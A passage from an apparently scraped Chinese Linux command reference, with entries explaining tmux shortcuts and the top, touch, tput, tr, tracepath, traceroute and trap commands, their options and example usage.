<div>选择要脱离的会话；在同时开启了多个会话时使用</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>Ctrl+z</div>\n</td>\n<td>\n  <div>挂起当前会话</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>r</div>\n</td>\n<td>\n  <div>强制重绘未脱离的会话</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>s</div>\n</td>\n<td>\n  <div>选择并切换会话；在同时开启了多个会话时使用</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>:</div>\n</td>\n<td>\n  <div>进入命令行模式；此时可以输入支持的命令，例如kill-server可以关闭服务器</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>[</div>\n</td>\n<td>\n  <div>进入复制模式；此时的操作与vi/emacs相同，按q/Esc退出</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>~</div>\n</td>\n<td>\n  <div>列出提示信息缓存；其中包含了之前tmux返回的各种提示信息</div>\n</td>\n</tr>\n<tr>\n<td rowspan=\"10\" align=\"left\" valign=\"center\" width=\"0\">\n  <div>窗口操作</div>\n</td>\n<td>\n  <div>c</div>\n</td>\n<td>\n  <div>创建新窗口</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>&amp;</div>\n</td>\n<td>\n  <div>关闭当前窗口</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>数字键</div>\n</td>\n<td>\n  <div>切换至指定窗口</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>p</div>\n</td>\n<td>\n  <div>切换至上一窗口</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>n</div>\n</td>\n<td>\n  <div>切换至下一窗口</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>l</div>\n</td>\n<td>\n  <div>在前后两个窗口间互相切换</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>w</div>\n</td>\n<td>\n  <div>通过窗口列表切换窗口</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>,</div>\n</td>\n<td>\n  <div>重命名当前窗口；这样便于识别</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>.</div>\n</td>\n<td>\n  <div>修改当前窗口编号；相当于窗口重新排序</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>f</div>\n</td>\n<td>\n  <div>在所有窗口中查找指定文本</div>\n</td>\n</tr>\n<tr>\n<td rowspan=\"14\" align=\"left\" valign=\"center\" width=\"0\">\n  <div>面板操作</div>\n</td>\n<td>\n  <div>”</div>\n</td>\n<td>\n  <div>将当前面板平分为上下两块</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>%</div>\n</td>\n<td>\n  <div>将当前面板平分为左右两块</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>x</div>\n</td>\n<td>\n  <div>关闭当前面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>!</div>\n</td>\n<td>\n  <div>将当前面板置于新窗口；即新建一个窗口，其中仅包含当前面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>Ctrl+方向键</div>\n</td>\n<td>\n  <div>以1个单元格为单位移动边缘以调整当前面板大小</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>Alt+方向键</div>\n</td>\n<td>\n  <div>以5个单元格为单位移动边缘以调整当前面板大小</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>Space</div>\n</td>\n<td>\n  <div>在预置的面板布局中循环切换；依次包括even-horizontal、even-vertical、main-horizontal、main-vertical、tiled</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>q</div>\n</td>\n<td>\n  <div>显示面板编号</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>o</div>\n</td>\n<td>\n  <div>在当前窗口中选择下一面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>方向键</div>\n</td>\n<td>\n  <div>移动光标以选择面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>{</div>\n</td>\n<td>\n  <div>向前置换当前面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>}</div>\n</td>\n<td>\n  <div>向后置换当前面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>Alt+o</div>\n</td>\n<td>\n  <div>逆时针旋转当前窗口的面板</div>\n</td>\n</tr>\n<tr>\n<td>\n  <div>Ctrl+o</div>\n</td>\n<td>\n  <div>顺时针旋转当前窗口的面板</div>\n</td>\n</tr>\n</tbody>\n</table>\n\n1）进入tmux面板后，一定要先按ctrl+b，然后松开，再按其他的组合键才生效。\n2）常用到的几个组合键：\n\n```shell\nctrl+b ?        #     显示快捷键帮助\nctrl+b 空格键   #     采用下一个内置布局，这个很有意思，在多屏时，用这个就会将多有屏幕竖着展示\nctrl+b !        #     把当前窗口变为新窗口\nctrl+b  \"       #     模向分隔窗口\nctrl+b %        #     纵向分隔窗口\nctrl+b q        #     显示分隔窗口的编号\nctrl+b o        #     跳到下一个分隔窗口。多屏之间的切换\nctrl+b 上下键   #    上一个及下一个分隔窗口\nctrl+b C-方向键 #    调整分隔窗口大小\nctrl+b &        #    确认后退出当前tmux\nctrl+b [        #    复制模式，即将当前屏幕移到上一个的位置上，其他所有窗口都向前移动一个。\nctrl+b c        #    创建新窗口\nctrl+b n        #    选择下一个窗口\nctrl+b l        #    最后使用的窗口\nctrl+b p        #    选择前一个窗口\nctrl+b w        #    以菜单方式显示及选择窗口\nctrl+b s        #    以菜单方式显示和选择会话。这个常用到，可以选择进入哪个tmux\nctrl+b t        #    显示时钟。然后按enter键后就会恢复到shell终端状态\nctrl+b d        #    脱离当前会话；这样可以暂时返回Shell界面，输入tmux attach能够重新进入之前的会话\n```\n\n## 参考资料\n\n- tmux 官网下载地址：http://tmux.github.io/ ","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tmux"]},{"title":"【Linux 命令】top","url":"/linux-command/top/","content":"\n显示或管理执行中的程序\n\n## 补充说明\n\n**top命令** 可以实时动态地查看系统的整体运行情况，是一个综合了多方信息监测系统性能和运行信息的实用工具。通过top命令所提供的互动式界面，用热键可以管理。\n\n###  语法\n\n```shell\ntop(选项)\n```\n\n###  选项\n\n```shell\n-b：以批处理模式操作；\n-c：显示完整的治命令；\n-d：屏幕刷新间隔时间；\n-I：忽略失效过程；\n-s：保密模式；\n-S：累积模式；\n-i<时间>：设置间隔时间；\n-u<用户名>：指定用户名；\n-p<进程号>：指定进程；\n-n<次数>：循环显示的次数。\n```\n\n###  top交互命令\n\n在top命令执行过程中可以使用的一些交互命令。这些命令都是单字母的，如果在命令行中使用了-s选项， 其中一些命令可能会被屏蔽。\n\n```shell\nh：显示帮助画面，给出一些简短的命令总结说明；\nk：终止一个进程；\ni：忽略闲置和僵死进程，这是一个开关式命令；\nq：退出程序；\nr：重新安排一个进程的优先级别；\nS：切换到累计模式；\ns：改变两次刷新之间的延迟时间（单位为s），如果有小数，就换算成ms。输入0值则系统将不断刷新，默认值是5s；\nf或者F：从当前显示中添加或者删除项目；\no或者O：改变显示项目的顺序；\nl：切换显示平均负载和启动时间信息；\nm：切换显示内存信息；\nt：切换显示进程和CPU状态信息；\nc：切换显示命令名称和完整命令行；\nM：根据驻留内存大小进行排序；\nP：根据CPU使用百分比大小进行排序；\nT：根据时间/累计时间进行排序；\nw：将当前设置写入~/.toprc文件中。\n```\n\n###  实例\n\n```shell\ntop - 09:44:56 up 16 days, 21:23,  1 user,  load average: 9.59, 4.75, 1.92\nTasks: 145 total,   2 running, 143 sleeping,   0 stopped,   0 zombie\nCpu(s): 99.8%us,  0.1%sy,  0.0%ni,  0.2%id,  0.0%wa,  0.0%hi,  0.0%si,  0.0%st\nMem:   4147888k total,  2493092k used,  1654796k free,   158188k buffers\nSwap:  5144568k total,       56k used,  5144512k free,  2013180k cached\n```\n\n **解释：** \n\n*  top - 09:44:56[当前系统时间],\n*  16 days[系统已经运行了16天],\n*  1 user[个用户当前登录],\n*  load average: 9.59, 4.75, 1.92[系统负载，即任务队列的平均长度]\n*  Tasks: 145 total[总进程数],\n*  2 running[正在运行的进程数],\n*  143 sleeping[睡眠的进程数],\n*  0 stopped[停止的进程数],\n*  0 zombie[冻结进程数],\n*  Cpu(s): 99.8%us[用户空间占用CPU百分比],\n*  0.1%sy[内核空间占用CPU百分比],\n*  0.0%ni[用户进程空间内改变过优先级的进程占用CPU百分比],\n*  0.2%id[空闲CPU百分比], 0.0%wa[等待输入输出的CPU时间百分比],\n*  0.0%hi[],\n*  0.0%st[],\n*  Mem: 4147888k total[物理内存总量],\n*  2493092k used[使用的物理内存总量],\n*  1654796k free[空闲内存总量],\n*  158188k buffers[用作内核缓存的内存量]\n*  Swap:  5144568k total[交换区总量],\n*  56k used[使用的交换区总量],\n*  5144512k free[空闲交换区总量],\n*  2013180k cached[缓冲的交换区总量],\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","top"]},{"title":"【Linux 命令】touch","url":"/linux-command/touch/","content":"\n创建新的空文件\n\n## 补充说明\n\n**touch命令** 有两个功能：一是用于把已存在文件的时间标签更新为系统当前的时间（默认方式），它们的数据将原封不动地保留下来；二是用来创建新的空文件。\n\n###  语法\n\n```shell\ntouch(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：或--time=atime或--time=access或--time=use  只更改存取时间；\n-c：或--no-create  不建立任何文件；\n-d：<时间日期> 使用指定的日期时间，而非现在的时间；\n-f：此参数将忽略不予处理，仅负责解决BSD版本touch指令的兼容性问题；\n-m：或--time=mtime或--time=modify  只更该变动时间；\n-r：<参考文件或目录>  把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；\n-t：<日期时间>  使用指定的日期时间，而非现在的时间；\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n###  参数\n\n文件：指定要设置时间属性的文件列表。\n\n###  实例\n\n```shell\ntouch ex2\n```\n\n在当前目录下建立一个空文件ex2，然后，利用`ls -l`命令可以发现文件ex2的大小为0，表示它是空文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","touch"]},{"title":"【Linux 命令】tput","url":"/linux-command/tput/","content":"\n通过terminfo数据库对终端会话进行初始化和操作\n\n## 补充说明\n\n**tput命令** 将通过 terminfo 数据库对您的终端会话进行初始化和操作。通过使用 tput，您可以更改几项终端功能，如移动或更改光标、更改文本属性，以及清除终端屏幕的特定区域。\n\n###  什么是 terminfo 数据库？\n\nUNIX 系统上的 terminfo 数据库用于定义终端和打印机的属性及功能，包括各设备（例如，终端和打印机）的行数和列数以及要发送至该设备的文本的属性。UNIX 中的几个常用程序都依赖 terminfo 数据库提供这些属性以及许多其他内容，其中包括 vi 和 emacs 编辑器以及 curses 和 man 程序。\n\n与 UNIX 中的大多数命令一样，tput 命令既可以用在 shell 命令行中也可以用在 shell 脚本中。为让您更好地理解 tput，本文首先从命令行讲起，然后紧接着讲述 shell 脚本示例。\n\n **光标属性** \n\n在 UNIX shell 脚本中或在命令行中，移动光标或更改光标属性可能是非常有用的。有些情况下，您可能需要输入敏感信息（如密码），或在屏幕上两个不同的区域输入信息。在此类情况下，使用 tput 可能会对您有所帮助。\n\n```shell\ntput clear # 清屏\ntput sc # 保存当前光标位置\ntput cup 10 13 # 将光标移动到 row col\ntput civis # 光标不可见\ntput cnorm # 光标可见\ntput rc # 显示输出\nexit 0\n```\n\n **移动光标** \n\n使用 tput 可以方便地实现在各设备上移动光标的位置。通过在 tput 中使用 cup 选项，或光标位置，您可以在设备的各行和各列中将光标移动到任意 X 或 Y 坐标。设备左上角的坐标为 (0,0)。\n\n要在设备上将光标移动到第 5 列 (X) 的第 1 行 (Y)，只需执行 tput cup 5 1。另一个示例是 tput cup 23 45，此命令将使光标移动到第 23 列上的第 45 行。\n\n **移动光标并显示信息** \n\n另一种有用的光标定位技巧是移动光标，执行用于显示信息的命令，然后返回到前一光标位置：\n\n```shell\n(tput sc ; tput cup 23 45 ; echo “Input from tput/echo at 23/45” ; tput rc)\n```\n\n下面我们分析一下 subshell 命令：\n\n```shell\ntput sc\n```\n\n必须首先保存当前的光标位置。要保存当前的光标位置，请包括 sc 选项或“save cursor position”。\n\n```shell\ntput cup 23 45\n```\n\n在保存了光标位置后，光标坐标将移动到 (23,45)。\n\n```shell\necho “Input from tput/echo at 23/45”\n```\n\n将信息显示到 stdout 中。\n\n```shell\ntput rc\n```\n\n在显示了这些信息之后，光标必须返回到使用 tput sc 保存的原始位置。要使光标返回到其上次保存的位置，请包括 rc 选项或“restore cursor position”。\n\n注意：由于本文首先详细介绍了通过命令行执行 tput，因此您可能会觉得在自己的 subshell 中执行命令要比单独执行每条命令然后在每条命令执行之前显示提示更简洁。\n\n **更改光标的属性** \n\n在向某一设备显示数据时，很多时候您并不希望看到光标。将光标转换为不可见可以使数据滚动时的屏幕看起来更整洁。要使光标不可见，请使用 civis 选项（例如，tput civis）。在数据完全显示之后，您可以使用 cnorm 选项将光标再次转变为可见。\n\n **文本属性** \n\n更改文本的显示方式可以让用户注意到菜单中的一组词或警惕用户注意某些重要的内容。您可以通过以下方式更改文本属性：使文本加粗、在文本下方添加下划线、更改背景颜色和前景颜色，以及逆转颜色方案等。\n\n要更改文本的颜色，请使用 setb 选项（用于设置背景颜色）和 setf 选项（用于设置前景颜色）以及在 terminfo 数据库中分配的颜色数值。通常情况下，分配的数值与颜色的对应关系如下，但是可能会因 UNIX 系统的不同而异：\n\n*   0：黑色\n*   1：蓝色\n*   2：绿色\n*   3：青色\n*   4：红色\n*   5：洋红色\n*   6：黄色\n*   7：白色\n\n执行以下示例命令可以将背景颜色更改为黄色，将前景颜色更改为红色：\n\n```shell\ntput setb 6 tput setf 4\n```\n\n要反显当前的颜色方案，只需执行`tput rev`。\n\n有时，仅为文本着色还不够，也就是说，您想要通过另一种方式引起用户的注意。可以通过两种方式达到这一目的：一是将文本设置为粗体，二是为文本添加下划线。\n\n要将文本更改为粗体，请使用 bold 选项。要开始添加下划线，请使用 smul 选项。在完成显示带下划线的文本后，请使用 rmul 选项。\n\n###  实例\n\n使输出的字符串有颜色，底色，加粗：\n\n```shell\n#!/bin/bash\nprintf $(tput setaf 2; tput bold)'color show\\n\\n'$(tput sgr0)\n\nfor((i=0; i<=7; i++)); do\n    echo $(tput setaf $i)\"show me the money\"$(tput sgr0)\ndone\n\nprintf '\\n'$(tput setaf 2; tput setab 0; tput bold)'background color show'$(tput sgr0)'\\n\\n'\n\nfor((i=0,j=7; i<=7; i++,j--)); do\n    echo $(tput setaf $i; tput setab $j; tput bold)\"show me the money\"$(tput sgr0)\ndone\n\nexit 0\n```\n\n输出格式控制函数：\n\n```shell\n#!/bin/bash\n\n# $1 str       print string\n# $2 color     0-7 设置颜色\n# $3 bgcolor   0-7 设置背景颜色\n# $4 bold      0-1 设置粗体\n# $5 underline 0-1 设置下划线\n\nfunction format_output(){\n    str=$1\n    color=$2\n    bgcolor=$3\n    bold=$4\n    underline=$5\n    normal=$(tput sgr0)\n\n    case \"$color\" in\n        0|1|2|3|4|5|6|7)\n            setcolor=$(tput setaf $color;) ;;\n        *)\n            setcolor=\"\" ;;\n    esac\n\n    case \"$bgcolor\" in\n        0|1|2|3|4|5|6|7)\n            setbgcolor=$(tput setab $bgcolor;) ;;\n        *)\n            setbgcolor=\"\" ;;\n    esac\n\n    if [ \"$bold\" = \"1\" ]; then\n        setbold=$(tput bold;)\n    else\n        setbold=\"\"\n    fi\n\n    if [ \"$underline\" = \"1\" ]; then\n        setunderline=$(tput smul;)\n    else\n        setunderline=\"\"\n    fi\n\n    printf \"$setcolor$setbgcolor$setbold$setunderline$str$normal\\n\"\n}\n\nformat_output \"Yesterday Once more\" 2 5 1 1\n\nexit 0\n```\n\n光标属性例子：\n\n```shell\n#!/bin/bash\n# clear the screen\ntput clear\n# Move cursor to screen location X,Y (top left is 0,0)\ntput cup 3 15\n# set a foreground colour using ANSI escape\ntput setaf 3\necho \"XYX Corp LTD.\"\ntput sgr0\ntput cup 5 17\n# Set reverse video mode\ntput rev\necho \"M A I N - M E N U\"\ntput sgr0\ntput cup 7 15\necho \"1\\. User Management\"\ntput cup 8 15\necho \"2\\. service Management\"\ntput cup 9 15\necho \"3\\. Process Management\"\ntput cup 10 15\necho \"4\\. Backup\"\n# Set bold mode\ntput bold\ntput cup 12 15\nread -p \"Enter your choice [1-4] \" choice\ntput clear\ntput sgr0\ntput rc\n\nexit 0\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tput"]},{"title":"【Linux 命令】tr","url":"/linux-command/tr/","content":"\n将字符进行替换压缩和删除\n\n## 补充说明\n\n**tr命令** 可以对来自标准输入的字符进行替换、压缩和删除。它可以将一组字符变成另一组字符，经常用来编写优美的单行命令，作用很强大。\n\n###  语法\n\n```shell\ntr(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c或——complerment：取代所有不属于第一字符集的字符；\n-d或——delete：删除所有属于第一字符集的字符；\n-s或--squeeze-repeats：把连续重复的字符以单独一个字符表示；\n-t或--truncate-set1：先删除第一字符集较第二字符集多出的字符。\n```\n\n###  参数\n\n*   字符集1：指定要转换或删除的原字符集。当执行转换操作时，必须使用参数“字符集2”指定转换的目标字符集。但执行删除操作时，不需要参数“字符集2”；\n*   字符集2：指定要转换成的目标字符集。\n\n###  实例\n\n将输入字符由大写转换为小写：\n\n```shell\necho \"HELLO WORLD\" | tr 'A-Z' 'a-z'\nhello world\n```\n\n'A-Z' 和 'a-z'都是集合，集合是可以自己制定的，例如：'ABD-}'、'bB.,'、'a-de-h'、'a-c0-9'都属于集合，集合里可以使用'\\n'、'\\t'，可以可以使用其他ASCII字符。\n\n使用tr删除字符：\n\n```shell\necho \"hello 123 world 456\" | tr -d '0-9'\nhello  world \n```\n\n将制表符转换为空格：\n\n```shell\ncat text | tr '\\t' ' '\n```\n\n字符集补集，从输入文本中将不在补集中的所有字符删除：\n\n```shell\necho aa.,a 1 b#$bb 2 c*/cc 3 ddd 4 | tr -d -c '0-9 \\n'\n 1  2  3  4\n```\n\n此例中，补集中包含了数字0~9、空格和换行符\\n，所以没有被删除，其他字符全部被删除了。\n\n用tr压缩字符，可以压缩输入中重复的字符：\n\n```shell\necho \"thissss is      a text linnnnnnne.\" | tr -s ' sn'\nthis is a text line.\n```\n\n巧妙使用tr做数字相加操作：\n\n```shell\necho 1 2 3 4 5 6 7 8 9 | xargs -n1 | echo $[ $(tr '\\n' '+') 0 ]\n```\n\n删除Windows文件“造成”的'^M'字符：\n\n```shell\ncat file | tr -s \"\\r\" \"\\n\" > new_file\n或\ncat file | tr -d \"\\r\" > new_file\n```\n\n **tr可以使用的字符类：** \n\n```shell\n[:alnum:]：字母和数字\n[:alpha:]：字母\n[:cntrl:]：控制（非打印）字符\n[:digit:]：数字\n[:graph:]：图形字符\n[:lower:]：小写字母\n[:print:]：可打印字符\n[:punct:]：标点符号\n[:space:]：空白字符\n[:upper:]：大写字母\n[:xdigit:]：十六进制字符  \n```\n\n使用方式：\n\n```shell\ntr '[:lower:]' '[:upper:]'\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tr"]},{"title":"【Linux 命令】tracepath","url":"/linux-command/tracepath/","content":"\n追踪目的主机经过的路由信息\n\n## 补充说明\n\n**tracepath命令** 用来追踪并显示报文到达目的主机所经过的路由信息。\n\n###  语法\n\n```shell\ntracepath(参数)\n```\n\n###  参数\n\n*   目的主机：指定追踪路由信息的目的主机；\n*   端口：指定使用的UDP端口号。\n\n###  实例\n\n```shell\ntracepath www.58.com\n 1:  192.168.2.10 (192.168.2.10)                           20.150ms pmtu 1500\n 1:  unknown (192.168.2.1)                                  9.343ms\n 2:  221.6.45.33 (221.6.45.33)                             34.430ms\n 3:  221.6.9.81 (221.6.9.81)                               19.263ms\n 4:  122.96.66.37 (122.96.66.37)                           54.372ms\n 5:  219.158.96.149 (219.158.96.149)                      asymm  6 128.526ms\n 6:  123.126.0.66 (123.126.0.66)                          138.281ms\n 7:  124.65.57.26 (124.65.57.26)                          166.244ms\n 8:  61.148.154.98 (61.148.154.98)                        103.723ms\n 9:  202.106.42.102 (202.106.42.102)                      asymm 10  78.099ms\n10:  210.77.139.150 (210.77.139.150)                      asymm  9 199.930ms\n11:  211.151.104.6 (211.151.104.6)                        asymm 10 121.965ms\n12:  no reply\n13:  211.151.111.30 (211.151.111.30)                      asymm 12 118.989ms reached\n     Resume: pmtu 1500 hops 13 back 12\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tracepath"]},{"title":"【Linux 命令】traceroute","url":"/linux-command/traceroute/","content":"\n显示数据包到主机间的路径\n\n## 补充说明\n\n**traceroute命令** 用于追踪数据包在网络上的传输时的全部路径，它默认发送的数据包大小是40字节。\n\n通过traceroute我们可以知道信息从你的计算机到互联网另一端的主机是走的什么路径。当然每次数据包由某一同样的出发点（source）到达某一同样的目的地(destination)走的路径可能会不一样，但基本上来说大部分时候所走的路由是相同的。\n\ntraceroute通过发送小的数据包到目的设备直到其返回，来测量其需要多长时间。一条路径上的每个设备traceroute要测3次。输出结果中包括每次测试的时间(ms)和设备的名称（如有的话）及其ip地址。\n\n###  语法 \n\n```shell\ntraceroute(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-d：使用Socket层级的排错功能；\n-f<存活数值>：设置第一个检测数据包的存活数值TTL的大小；\n-F：设置勿离断位；\n-g<网关>：设置来源路由网关，最多可设置8个；\n-i<网络界面>：使用指定的网络界面送出数据包；\n-I：使用ICMP回应取代UDP资料信息；\n-m<存活数值>：设置检测数据包的最大存活数值TTL的大小；\n-n：直接使用IP地址而非主机名称；\n-p<通信端口>：设置UDP传输协议的通信端口；\n-r：忽略普通的Routing Table，直接将数据包送到远端主机上。\n-s<来源地址>：设置本地主机送出数据包的IP地址；\n-t<服务类型>：设置检测数据包的TOS数值；\n-v：详细显示指令的执行过程；\n-w<超时秒数>：设置等待远端主机回报的时间；\n-x：开启或关闭数据包的正确性检验。\n```\n\n###  参数 \n\n主机：指定目的主机IP地址或主机名。\n\n###  实例 \n\n```shell\ntraceroute www.58.com\ntraceroute to www.58.com (211.151.111.30), 30 hops max, 40 byte packets\n 1  unknown (192.168.2.1)  3.453 ms  3.801 ms  3.937 ms\n 2  221.6.45.33 (221.6.45.33)  7.768 ms  7.816 ms  7.840 ms\n 3  221.6.0.233 (221.6.0.233)  13.784 ms  13.827 ms 221.6.9.81 (221.6.9.81)  9.758 ms\n 4  221.6.2.169 (221.6.2.169)  11.777 ms 122.96.66.13 (122.96.66.13)  34.952 ms 221.6.2.53 (221.6.2.53)  41.372 ms\n 5  219.158.96.149 (219.158.96.149)  39.167 ms  39.210 ms  39.238 ms\n 6  123.126.0.194 (123.126.0.194)  37.270 ms 123.126.0.66 (123.126.0.66)  37.163 ms  37.441 ms\n 7  124.65.57.26 (124.65.57.26)  42.787 ms  42.799 ms  42.809 ms\n 8  61.148.146.210 (61.148.146.210)  30.176 ms 61.148.154.98 (61.148.154.98)  32.613 ms  32.675 ms\n 9  202.106.42.102 (202.106.42.102)  44.563 ms  44.600 ms  44.627 ms\n10  210.77.139.150 (210.77.139.150)  53.302 ms  53.233 ms  53.032 ms\n11  211.151.104.6 (211.151.104.6)  39.585 ms  39.502 ms  39.598 ms\n12  211.151.111.30 (211.151.111.30)  35.161 ms  35.938 ms  36.005 ms\n```\n\n记录按序列号从1开始，每个纪录就是一跳 ，每跳表示一个网关，我们看到每行有三个时间，单位是ms，其实就是`-q`的默认参数。探测数据包向每个网关发送三个数据包后，网关响应后返回的时间；如果用`traceroute -q 4 www.58.com`，表示向每个网关发送4个数据包。\n\n有时我们traceroute一台主机时，会看到有一些行是以星号表示的。出现这样的情况，可能是防火墙封掉了ICMP的返回信息，所以我们得不到什么相关的数据包返回数据。\n\n有时我们在某一网关处延时比较长，有可能是某台网关比较阻塞，也可能是物理设备本身的原因。当然如果某台DNS出现问题时，不能解析主机名、域名时，也会 有延时长的现象；您可以加`-n`参数来避免DNS解析，以IP格式输出数据。\n\n如果在局域网中的不同网段之间，我们可以通过traceroute 来排查问题所在，是主机的问题还是网关的问题。如果我们通过远程来访问某台服务器遇到问题时，我们用到traceroute 追踪数据包所经过的网关，提交IDC服务商，也有助于解决问题；但目前看来在国内解决这样的问题是比较困难的，就是我们发现问题所在，IDC服务商也不可能帮助我们解决。\n\n**跳数设置**\n\n```shell\n[root@localhost ~]# traceroute -m 10 www.baidu.com\ntraceroute to www.baidu.com (61.135.169.105), 10 hops max, 40 byte packets\n 1  192.168.74.2 (192.168.74.2)  1.534 ms  1.775 ms  1.961 ms\n 2  211.151.56.1 (211.151.56.1)  0.508 ms  0.514 ms  0.507 ms\n 3  211.151.227.206 (211.151.227.206)  0.571 ms  0.558 ms  0.550 ms\n 4  210.77.139.145 (210.77.139.145)  0.708 ms  0.729 ms  0.785 ms\n 5  202.106.42.101 (202.106.42.101)  7.978 ms  8.155 ms  8.311 ms\n 6  bt-228-037.bta.net.cn (202.106.228.37)  772.460 ms bt-228-025.bta.net.cn (202.106.228.25)  2.152 ms 61.148.154.97 (61.148.154.97)  772.107 ms\n 7  124.65.58.221 (124.65.58.221)  4.875 ms 61.148.146.29 (61.148.146.29)  2.124 ms 124.65.58.221 (124.65.58.221)  4.854 ms\n 8  123.126.6.198 (123.126.6.198)  2.944 ms 61.148.156.6 (61.148.156.6)  3.505 ms 123.126.6.198 (123.126.6.198)  2.885 ms\n 9  * * *\n10  * * *\n```\n\n其它一些实例\n\n```shell\ntraceroute -m 10 www.baidu.com # 跳数设置\ntraceroute -n www.baidu.com    # 显示IP地址，不查主机名\ntraceroute -p 6888 www.baidu.com  # 探测包使用的基本UDP端口设置6888\ntraceroute -q 4 www.baidu.com  # 把探测包的个数设置为值4\ntraceroute -r www.baidu.com    # 绕过正常的路由表，直接发送到网络相连的主机\ntraceroute -w 3 www.baidu.com  # 把对外发探测包的等待响应时间设置为3秒\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","traceroute"]},{"title":"【Linux 命令】trap","url":"/linux-command/trap/","content":"\n捕捉信号和其他事件并执行命令。\n\n## 概要\n\n```shell\ntrap [-lp] [[arg] signal_spec ...]\n```\n\n## 主要用途\n\n- 用于指定在接收到信号后将要采取的动作。\n- 脚本程序被中断时执行清理工作。\n\n## 选项\n\n```shell\n-l    打印信号名称以及信号名称对应的数字。\n-p    显示与每个信号关联的trap命令。\n```\n\n## 参数\n\narg：接收到信号时执行的命令。\n \nsignal_spec：信号名称或信号名称对应的数字。\n\n## 返回值\n\n如果表达式执行结果为成功时返回0，当参数 `signal_spec` 没有指定有效值时返回1。\n\n## 关于信号\n\n信号是一种进程间通信机制，它给应用程序提供一种异步的软件中断，使应用程序有机会接受其他程序活终端发送的命令(即信号)。应用程序收到信号后，有三种处理方式：忽略，默认，或捕捉。进程收到一个信号后，会检查对该信号的处理机制。如果是SIG_IGN，就忽略该信号；如果是SIG_DFT，则会采用系统默认的处理动作，通常是终止进程或忽略该信号；如果给该信号指定了一个处理函数(捕捉)，则会中断当前进程正在执行的任务，转而去执行该信号的处理函数，返回后再继续执行被中断的任务。\n\n在有些情况下，我们不希望自己的shell脚本在运行时刻被中断，比如说我们写得shell脚本设为某一用户的默认shell，使这一用户进入系统后只能作某一项工作，如数据库备份， 我们可不希望用户使用 Ctrl+C 等方法进入到shell状态做我们不希望做的事情。这便用到了信号处理。\n\n以下是一些你可能会遇到的常见信号：\n\n<table>\n<tbody>\n<tr>\n<th width=\"100\">信号名称</th>\n<th width=\"60\">信号数</th>\n<th>描述</th>\n</tr>\n<tr>\n<td>SIGHUP</td>\n<td>1</td>\n<td>本信号在用户终端连接（正常或非正常）结束时发出，通常是在终端的控制进程结束时，通知同一session内的各个作业，这时它们与控制终端不再关联。登录Linux时，系统会分配给登录用户一个终端(Session)。在这个终端运行的所有程序，包括前台进程组和后台进程组，一般都属于这个Session。当用户退出Linux登录时，前台进程组和后台有对终端输出的进程将会收到SIGHUP信号。这个信号的默认操作为终止进程，因此前台进程组和后台有终端输出的进程就会中止。对于与终端脱离关系的守护进程，这个信号用于通知它重新读取配置文件。</td>\n</tr>\n<tr>\n<td>SIGINT</td>\n<td>2</td>\n<td>程序终止(interrupt)信号，在用户键入 Ctrl+C 时发出。</td>\n</tr>\n<tr>\n<td>SIGQUIT</td>\n<td>3</td>\n<td>和SIGINT类似，但由QUIT字符(通常是Ctrl /)来控制。进程在因收到SIGQUIT退出时会产生core文件，在这个意义上类似于一个程序错误信号。</td>\n</tr>\n<tr>\n<td>SIGFPE</td>\n<td>8</td>\n<td>在发生致命的算术运算错误时发出。不仅包括浮点运算错误，还包括溢出及除数为0等其它所有的算术错误。</td>\n</tr>\n<tr>\n<td>SIGKILL</td>\n<td>9</td>\n<td>用来立即结束程序的运行。本信号不能被阻塞，处理和忽略。</td>\n</tr>\n<tr>\n<td>SIGALRM</td>\n<td>14</td>\n<td>时钟定时信号，计算的是实际的时间或时钟时间。alarm 函数使用该信号。</td>\n</tr>\n<tr>\n<td>SIGTERM</td>\n<td>15</td>\n<td>程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理. 通常用来要求程序自己正常退出；kill 命令缺省产生这个信号。</td>\n</tr>\n</tbody>\n</table>\n\n\n## 例子\n\n当shell收到 `HUP INT PIPE QUIT TERM` 这几个命令时，当前执行的程序会执行 `exit 1`。\n\n```shell\n[root@pc root]$ trap \"exit 1\" HUP INT PIPE QUIT TERM\n```\n\n### 1 清理临时文件\n\n下面展示了如果有人试图从终端中止程序时，如何删除文件然后退出：\n\n```shell\ntrap \"rm -f $WORKDIR/work1 $WORKDIR/dataout; exit\" 2\n```\n\n执行shell程序，如果程序接收信号为2，那么这两个文件 （work1 和 dataout） 将被自动删除。\n\n添加信号1 